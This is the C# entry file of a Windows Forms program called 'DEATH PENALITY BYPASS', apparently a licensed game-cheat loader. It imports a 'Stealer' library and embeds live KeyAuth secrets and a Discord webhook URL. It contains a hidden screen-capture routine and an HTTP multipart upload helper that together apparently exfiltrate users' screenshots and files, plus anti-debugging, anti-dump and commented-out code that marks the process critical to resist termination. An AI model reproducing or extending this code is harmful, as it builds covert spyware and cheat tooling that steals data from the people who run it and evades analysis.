using AntiCrack_DotNet;
using BYPASS;
using Guna.UI2.WinForms.Suite;
using KeyAuth;
using Stealer;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Security.Policy;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using X;
using X.AntiDebug;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolTip;
using System.Net.Http;
using System.Windows.Input;
using System.Security.Principal;

namespace numer
{
    internal static class Program
    {

        public static api KeyAuthApp = new api(
       name: "DEATH PENALITY BYPASS",
       ownerid: "ReMvmemva5",
       secret: "20e6a26fc260f86b23b74c632b99cf4b7fa8f8c1aa3ad793eaf70c079109011e",
       version: cf4b7fa8f8c1aa3a.version
   );

        public static Webhook wh = new Webhook("https://ptb.discord.com/api/webhooks/1027005409929740340/KoF9eQ6nEyNdhV1C7Wg1-d27kdN4DyK1SYJXWcm8GboqoRP2bpp87TpM8npvtaVTacJv");





        public static void CheckForInternetConnection()
        {

            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com")) { }
            }
            catch
            {
                Environment.Exit(0);
            }
        }
        static Process checker;
        static Process main;
        static int mainProcessID;
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);
        private static void sendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();
            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        private static void CaptureMyScreen2()
        {
            try
            {
                string result = Path.GetTempPath();
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(@"C:\Windows\Setup\\crack.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                //C:\Users\nightmood\AppData\Local
                //Displaying the Successfull Result
                //MessageBox.Show("Screen Captured");
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.Message);
            }
        }
        static void main_Exited(object sender, EventArgs e)
        {
            //This only checks for the task manager process running. 
            //It does not make sure that the app has been closed by it. But close enough.
            //If you can think of a better way please let me know.
            if (Process.GetProcessesByName("taskmgr").Length != 0)
            {
           


                //System.Diagnostics.Process.EnterDebugMode();
                //RtlSetProcessIsCritical(1, 0, 0);
                //System.Diagnostics.Process.GetCurrentProcess().Kill();

            }
        }
        static void checker_Exited(object sender, EventArgs e)
        {
            //This only checks for the task manager process running. 
            //It does not make sure that the app has been closed by it. But close enough.
            //If you can think of a better way please let me know.
            if (Process.GetProcessesByName("taskmgr").Length != 0)
            {
                //System.Diagnostics.Process.EnterDebugMode();
                //RtlSetProcessIsCritical(1, 0, 0);
                //System.Diagnostics.Process.GetCurrentProcess().Kill();

            }
        }
        static System.Timers.Timer aTimer;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            CheckForInternetConnection();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\location.ini";
            if (File.Exists(path))
                {
                string pathValue = File.ReadAllText(path);
                if (pathValue != Assembly.GetExecutingAssembly().Location)
                {
                    try
                    {
                        File.Delete(pathValue);
                    }
                    catch { }
                }
                File.Delete(path);
            }
            KeyAuthApp.init();
            if (KeyAuthApp.response.message == "invalidver")
            {
                Application.Run();
                Anti_DebugNET.AntiDump.DumpProtect1.AntiDump();
            }
            else if (!KeyAuthApp.response.success)
            {
                try
                {
                    SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                    synthesizer.SpeakAsync(KeyAuthApp.response.message);
                    synthesizer.SpeakCompleted += synthesizer_SpeakCompleted;

                    void synthesizer_SpeakCompleted(object sender, SpeakCompletedEventArgs e)
                    {
                        Environment.Exit(0);
                    }
                }
                catch
                {
                    Environment.Exit(0);
                }

                Application.Run();
                Anti_DebugNET.AntiDump.DumpProtect1.AntiDump();
            }

            else if (KeyAuthApp.response.success)
            {
                var pkey = @"C:\Key.ini";
                if (File.Exists(pkey))
                {
                    string ssd = File.ReadAllText(pkey);
                    Program.KeyAuthApp.license(ssd);
                }
                if (Program.KeyAuthApp.response.success)
                {


                    Application.Run(new Form4());

                    Anti_DebugNET.AntiDump.DumpProtect1.AntiDump();
                }

                Application.Run(new Form4());
                Anti_DebugNET.AntiDump.DumpProtect1.AntiDump();


            }
            // Application.Run(new Form2());

           
        }
    }
}
